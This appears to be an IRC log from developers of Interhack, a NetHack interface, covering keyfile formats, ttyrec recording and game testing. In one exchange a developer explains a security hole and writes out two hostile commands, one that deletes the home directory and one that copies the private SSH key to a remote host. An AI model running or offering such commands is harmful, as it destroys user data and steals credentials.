@@ -1,0 +1,80 @@
+[00:45:03] <@toft> do you guys really like that date format of the keyfiles?
+[00:45:09] <@toft> in here
+[00:45:17] <@toft> runcible might asplode
+[00:45:41] <@Eidolos> it should be the same as used by nao
+[00:45:43] <@Eidolos> I'm just lazy
+[00:45:54] <@Eidolos> quick, disable monster-rename
+[00:45:54] <@toft> I'll do it if you want, after this game
+[00:45:59] <@Eidolos> killjoys
+[00:47:31] <@Eidolos> doy: you only need to record one or the other
+[00:47:52] <@doy> eh
+[00:48:24] <@Eidolos> I mean ttyrec
+[00:48:32] <@Eidolos> it'll grep from either one
+[00:48:39] <@doy> yeah, eh
+[00:48:40] <@doy> (:
+[00:48:51] <@Eidolos> I also don't think it's important to record straight-NH ttyrecs, since those are available on NAO
+[00:49:08] <@toft> I concur
+[00:49:43] <@toft> hmm
+[00:49:51] <@toft> magic traps make You feel tired. non-unique
+[00:49:53] <@toft> how annoying
+[00:49:59] <@doy> toft: yeah, nothing much can be done about that
+[00:50:17] <@Eidolos> could check to see if a gremlin chuckled very recently
+[00:50:23] <@toft> or could prompt
+[00:50:27] <@Eidolos> meh
+[00:50:40] <@Eidolos> automate internal state if possible
+[02:33:45] -!- greqrg [n=greqrg@ip-66-80-171-57.atl.megapath.net] has left #interhack []
+[11:11:37] -!- greqrg [n=greqrg@ip-66-80-171-57.atl.megapath.net] has joined #interhack
+[11:49:53] -!- greqrg [n=greqrg@ip-66-80-171-57.atl.megapath.net] has quit ["Trillian (http://www.ceruleanstudios.com"]
+[12:03:18] -!- greqrg [n=greqrg@ip-66-80-171-57.atl.megapath.net] has joined #interhack
+[12:16:55] <@toft> in huhrr eidoos
+[12:16:56] <@toft> O-o
+[12:17:03] <@Eidolos> lolo
+[12:17:03] <@toft> I fixed the timestamps
+[12:17:12] <@Eidolos> oh nice
+[12:17:13] <@Eidolos> thanks
+[12:17:35] <@toft> what was the hole?
+[12:18:05] <@Eidolos> :)
+[12:18:06] <@Eidolos> well
+[12:18:09] <@Eidolos> if you're watching someone
+[12:18:44] <@Eidolos> they can use #eval system("rm -rf $ENV{HOME}")
+[12:18:47] <@Eidolos> or worse
+[12:18:56] <@toft> oh snap
+[12:18:57] <@toft> heh
+[12:19:00] <@Eidolos> they can use #eval system("scp ~/.ssh/id_rsa <somewhere>")
+[12:19:46] <@Eidolos> bah, I hate when I accidentally resize a term
+[12:20:44] <@Eidolos> ok KDE lets you force a size on it, cool
+[12:22:09] <@toft> I just moved all my old ttyrecs and keyfiles to an archive folder
+[12:22:18] <@toft> could convert i gues but not worth my effort :)
+[12:22:33] <@Eidolos> script it!
+[12:22:54] <@toft> archive folder is good enough for me! I will probabl be never looking at them again anyway so
+[12:30:31] -!- ekiM [n=Mike@82-33-101-38.cable.ubr10.azte.blueyonder.co.uk] has joined #interhack
+[12:30:57] <@toft> all your cpu are belong to amaraok
+[13:37:33] <@toft> um
+[13:37:36] <@toft> The rape golem hits!  You are being choked.
+[13:37:44] <@toft> oh
+[13:37:44] <@toft> its your thing
+[13:37:45] <@toft> heh
+[13:37:48] <@doy> (:
+[13:37:56] <@doy> also, r<brown>ape</brown> golem
+[13:37:57] <@doy> (:
+[13:37:59] <@toft> yeah
+[13:44:57] <@Eidolos> mwa haha
+[14:58:22] <@doy> grep shouldn't catch the actual grep command
+[15:06:45] <@Eidolos> well
+[15:06:55] <@Eidolos> yes
+[15:43:11] <@Eidolos> you guys up for an LOL Rax. in #ne
+[15:43:12] <@Eidolos> ;)
+[15:44:17] <@toft> shure
+[15:45:08] < ekiM> sneaky
+[15:48:14] <@toft> http://crassworm.ath.cx/files/megalolrax.mpe
+[15:48:16] <@toft> http://crassworm.ath.cx/files/megalolrax.mp3
+[19:15:49] -!- greqrg [n=greqrg@ip-66-80-171-57.atl.megapath.net] has quit [Read error: 110 (Connection timed out)]
+[22:23:47] -!- greqrg [i=user@dialup-4.234.51.113.Dial1.Miami1.Level3.net] has joined #interhack
+[23:12:10] <@toft> scoot
+[23:12:13] <@toft> badoot
+[23:13:02] <@doy> all of the nomsg wands had worthless color already
+[23:13:04] <@toft> one LOL Rax. to rule them all, one LOL Rax. to find them
+[23:13:06] <@toft> yeah I know
+[23:23:22] -!- greqrg [i=user@dialup-4.234.51.113.Dial1.Miami1.Level3.net] has left #interhack []
+[23:24:40] <@Eidolos> just pushed fixes for IDing water
+[23:26:43] <@Eidolos> if one of you guys could test it that'd be great :)
